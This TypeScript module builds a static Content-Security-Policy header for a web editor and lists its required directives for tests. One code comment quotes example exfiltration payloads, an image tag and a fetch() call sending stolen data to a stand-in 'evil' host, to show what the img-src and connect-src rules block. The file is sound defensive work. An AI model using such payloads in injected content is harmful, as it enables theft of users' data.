/**
 * Static Content-Security-Policy for the editor (US-141 / E14).
 *
 * Enforced from `next.config.ts` headers — no middleware, no nonce, so static
 * rendering and the edge cache stay intact. Strict `script-src` (dropping
 * `'unsafe-inline'`) is US-142 and is deliberately not this story.
 */

export type ContentSecurityPolicyOptions = {
  /** When true, append `'unsafe-eval'` to `script-src` (React dev error stacks). */
  isDev: boolean;
};

/**
 * Build the CSP header value. Directives are joined with `; ` in a stable order
 * so tests can assert presence without caring about serialization noise.
 */
export function contentSecurityPolicy({ isDev }: ContentSecurityPolicyOptions): string {
  // `'unsafe-inline'` on script-src is deliberate: THEME_INIT_SCRIPT and Next's
  // hydration bootstraps need it until US-142 ships a per-request nonce. Do not
  // "tighten" this here — that change costs the edge cache (see US-142).
  const scriptSrc = isDev
    ? "script-src 'self' 'unsafe-inline' 'unsafe-eval'"
    : "script-src 'self' 'unsafe-inline'";

  // img-src and connect-src are the point of this story. They are what stops an
  // injected note from exfiltrating via `<img src="https://evil/?stolen">` or
  // `fetch('https://evil/…')`. Do not collapse them into `default-src` — a
  // future `default-src` widening would silently re-open that channel.
  return [
    "default-src 'self'",
    scriptSrc,
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: blob:",
    "font-src 'self'",
    "connect-src 'self'",
    "object-src 'none'",
    "frame-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    // Joins the existing X-Frame-Options: DENY — keep both so older browsers
    // that ignore frame-ancestors still refuse embedding.
    "frame-ancestors 'none'",
    'upgrade-insecure-requests',
  ].join('; ');
}

/** Directives every environment's policy must contain (for assertions). */
export const CSP_REQUIRED_DIRECTIVES = [
  "default-src 'self'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "font-src 'self'",
  "connect-src 'self'",
  "object-src 'none'",
  "frame-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'",
  'upgrade-insecure-requests',
] as const;
